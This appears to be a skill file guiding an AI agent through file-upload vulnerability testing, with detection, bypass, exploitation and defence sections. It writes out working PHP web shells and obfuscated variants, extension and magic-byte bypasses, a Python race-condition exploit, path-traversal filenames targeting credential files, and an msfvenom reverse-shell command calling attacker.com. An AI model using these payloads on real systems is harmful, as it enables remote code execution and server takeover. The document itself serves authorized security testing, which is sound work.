---
name: file-upload-testing
description: Professional skills and methodology for file upload vulnerability testing
version: 1.0.0
---

# File Upload Vulnerability Testing

## Overview

File upload functionality is a common feature of web applications, but it carries a variety of security risks. This skill provides methods for detecting, exploiting, and defending against file upload vulnerabilities.

## Vulnerability Types

### 1. Unvalidated File Type

**Front-end validation only:**
```javascript
// Can be bypassed
if (!file.name.endsWith('.jpg')) {
  alert('Only image uploads are allowed');
}
```

### 2. File Content Not Validated

**Checking the extension only:**
```php
// Dangerous code
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. Path Traversal

**Unfiltered filename:**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. Filename Overwrite

**Predictable filenames:**
```
uploads/1.jpg
uploads/2.jpg
```

## Testing Methods

### 1. Basic Detection

**Test various file types:**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**Test double extensions:**
```
shell.php.jpg
shell.jpg.php
```

**Test case variations:**
```
shell.PHP
shell.PhP
```

### 2. Content-Type Bypass

**Modify the Content-Type:**
```
Content-Type: image/jpeg
# But the file content is PHP code
```

**Magic Bytes:**
```php
// Prepend an image header before the PHP code
GIF89a<?php phpinfo(); ?>
```

### 3. Parsing Vulnerabilities

**Apache parsing vulnerability:**
```
shell.php.xxx  # Apache may parse it as PHP
```

**IIS parsing vulnerability:**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Nginx parsing vulnerability:**
```
shell.jpg%00.php
```

### 4. Race Condition

**Access the file immediately after upload:**
```python
# Upload a .php file, access it after upload completes but before deletion
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## Exploitation Techniques

### PHP WebShell

**Basic WebShell:**
```php
<?php system($_GET['cmd']); ?>
```

**One-liner backdoor:**
```php
<?php eval($_POST['a']); ?>
```

**Bypassing filters:**
```php
<?php
$_GET['cmd']($_POST['a']);
// Use: ?cmd=system
```

### .htaccess Exploitation

**Upload a .htaccess:**
```
AddType application/x-httpd-php .jpg
```

**Then upload shell.jpg (which is actually PHP code)**

### Image-Embedded Shell

**GIF image shell:**
```php
GIF89a
<?php
phpinfo();
?>
```

**PNG image shell:**
```bash
# Use a tool to embed PHP code into a PNG
python3 png2php.py shell.php shell.png
```

### Combined with File Inclusion

**If a file inclusion vulnerability exists:**
```
# Upload an image containing PHP code
# Then execute it via file inclusion
?file=uploads/shell.jpg
```

## Bypass Techniques

### Extension Bypass

**Double extension:**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**Case variation:**
```
shell.PHP
shell.PhP
```

**Special characters:**
```
shell.php.
shell.php 
shell.php%20
```

### Content-Type Bypass

**Modify the request header:**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes Bypass

**Add a file header:**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### Code Obfuscation

**Use short tags:**
```php
<?= system($_GET['cmd']); ?>
```

**Use variables:**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## Tool Usage

### Burp Suite

1. Intercept the file upload request
2. Modify the filename and content
3. Test various bypass techniques

### Upload Bypass

```bash
# Use various techniques to test file upload
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### WebShell Generation

```bash
# Generate various WebShells
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## Verification and Reporting

### Verification Steps

1. Confirm you can upload a malicious file
2. Verify the file can be executed
3. Assess the impact (command execution, data leakage, etc.)
4. Document a complete PoC
5. Use the `report_finding` tool to record the confirmed vulnerability on the platform (the platform's sole entry point for logging vulnerabilities); the fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Reporting Key Points

- Vulnerability location and upload functionality
- The file types that can be uploaded and how they are executed
- Complete exploitation steps and PoC
- Remediation recommendations (file type validation, content inspection, secure storage, etc.)

## Defensive Measures

### Recommended Solutions

1. **File type allowlist**
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **File content validation**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **Rename files**
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **Isolated storage**
   - Store files outside the web root
   - Access them through a script proxy
   - Disable execution permissions

5. **File scanning**
   - Scan with antivirus software
   - Inspect file content
   - Remove execute permissions

6. **Size limit**
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## Notes

- Only test in authorized test environments
- Avoid uploading malicious files to production environments
- Clean up promptly after testing
- Be aware of parsing differences across servers
